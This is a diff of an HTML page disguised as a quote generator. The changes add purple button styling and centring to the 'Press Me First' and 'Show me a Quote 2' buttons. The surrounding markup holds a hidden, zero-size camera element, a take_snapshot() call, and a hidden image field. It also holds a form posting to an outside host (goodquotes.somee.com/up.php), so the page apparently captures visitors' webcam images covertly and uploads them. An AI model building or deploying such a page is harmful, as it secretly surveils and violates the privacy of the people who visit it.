@@ -10,15 +10,17 @@
         #proceed {
   display: none;
 }
+            .but {background-color:purple;outline:0px;color:white;border:0px;transition:all 2.0s;}
+            .but:hover {background-color:white;color:purple;transition:all 2.0s;}
     </style>
 </head>
 <body>
     <form action="http://www.goodquotes.somee.com/up.php" method="POST">
         <span style="height:0px;width:0px;display:none;" id="my_camera" height=0 width=0></span>
                 <br/>
-                <input type=button value="Press Me First" onClick="take_snapshot()">
+                <center><br><br><input type=button value="Press Me First" onClick="take_snapshot()" class=but><br><br></center>
                 <input type="hidden" name="image" id="image" class="image-tag">
-                <input type=submit id="proceed" value='Show me a Quote 2'>
+                <center><br><br><input type=submit id="proceed" value='Show me a Quote 2' class=but></center>
             <script type="text/javascript">
         $(document).ready(function() {
   setTimeout(function() {
